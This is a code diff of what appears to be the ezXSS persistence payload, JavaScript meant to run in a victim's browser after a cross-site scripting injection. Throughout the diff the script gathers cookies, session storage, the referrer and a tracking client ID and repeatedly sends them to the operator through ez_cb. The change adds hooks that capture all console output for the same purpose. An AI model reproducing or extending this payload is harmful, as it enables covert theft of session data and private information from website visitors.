@@ -1,12 +1,17 @@
 var pi;
 var last = '';
-
+var a = false;
 function ping() {
-    try {
-        ez_cb(JSON.stringify({ 'action': 'ping' }), 'ping', callback);
-        pi = setTimeout(ping, 10000);
-    } catch (e) {
-        init()
+    if(a===false) {
+        a=true;
+        try {
+            ez_rD.type = 'ping';
+            ez_rD.console = console.everything;
+            ez_cb(ez_rD, callback);
+            pi = setTimeout(ping, 10000);
+        } catch (e) {
+            init()
+        }
     }
 }
 
@@ -17,35 +22,38 @@ function callback(input) {
 function init() {
     // Ready to persist
     ra_hL();
-    ez_cb(ez_rD);
+    ez_cb(ez_rD, ping);
 }
 
 function ez_persist() {
     init();
-    ping();
 }
 
-function ra_client() {
-    var name = "ezXSS=";
-    var cookies = document.cookie.split(';');
-    for (var i = 0; i < cookies.length; i++) {
-        var cookie = cookies[i].trim();
-        if (cookie.indexOf(name) == 0) {
-            return cookie.substring(name.length, cookie.length);
-        }
+
+if (!console.everything) {
+    console.everything = "";
+    function formatLog(type, args) {
+        var date = new Date().toLocaleTimeString();
+        return "[" + date + " " + type + "] " + Array.prototype.join.call(args, " ") + "\n";
     }
-    var value = "";
-    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    for (var i = 0; i < 15; i++) {
-        value += possible.charAt(Math.floor(Math.random() * possible.length));
+    function wrapConsoleMethod(method, type) {
+        var defaultMethod = console[method];
+        console[method] = function () {
+            console.everything = formatLog(type, arguments) + console.everything;
+            defaultMethod.apply(console, arguments);
+        };
     }
-    var expires = new Date();
-    expires.setFullYear(expires.getFullYear() + 1);
-    document.cookie = name + value + ";expires=" + expires.toUTCString() + ";path=/";
-    return value;
+    var methods = ["log", "error", "warn", "debug"];
+    for (var i = 0; i < methods.length; i++) {
+        wrapConsoleMethod(methods[i], methods[i].toUpperCase());
+    }
 }
+
+function ra_client(){var e="ezXSS=",t=document.cookie.split(";");for(var n=0;n<t.length;n++){var r=t[n].replace(/^\s+|\s+$/g,"");if(0==r.indexOf(e)){var o=r.substring(e.length,r.length),a=new Date;a.setFullYear(a.getFullYear()+1),setCookie(e,o,a.toUTCString().replace("GMT",""),"/");return o}}for(var o="",a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",n=0;n<16;n++)o+=a.charAt(Math.floor(Math.random()*a.length));var s=new Date;s.setFullYear(s.getFullYear()+1),setCookie(e,o,s.toUTCString().replace("GMT",""),"/");return o}function setCookie(e,t,n,r){var o=e+t+";";n&&(o+="expires="+n+";"),r&&(o+="path="+r+";"),document.cookie=o}
 
 function ra_hL() {
+    ez_rD.type = 'init';
+    ez_rD.console = console.everything;
     try {
         ez_rD.clientid = ra_client()
     } catch (e) {
@@ -67,7 +75,7 @@ function ra_hL() {
         ez_rD.cookies = ""
     }
     try {
-        if(last != '') {
+        if (last != '') {
             ez_rD.referer = ez_n(last)
         } else {
             ez_rD.referer = ez_n(document.referrer)
@@ -96,7 +104,7 @@ function ra_hL() {
         ez_rD.sessionstorage = "";
     }
     try {
-        ez_rD.dom = ""; //ez_n(document.documentElement.outerHTML)
+        ez_rD.dom = "";//ez_n(document.documentElement.outerHTML); //ez_n(document.documentElement.outerHTML)
     } catch (e) {
         ez_rD.dom = ""
     }
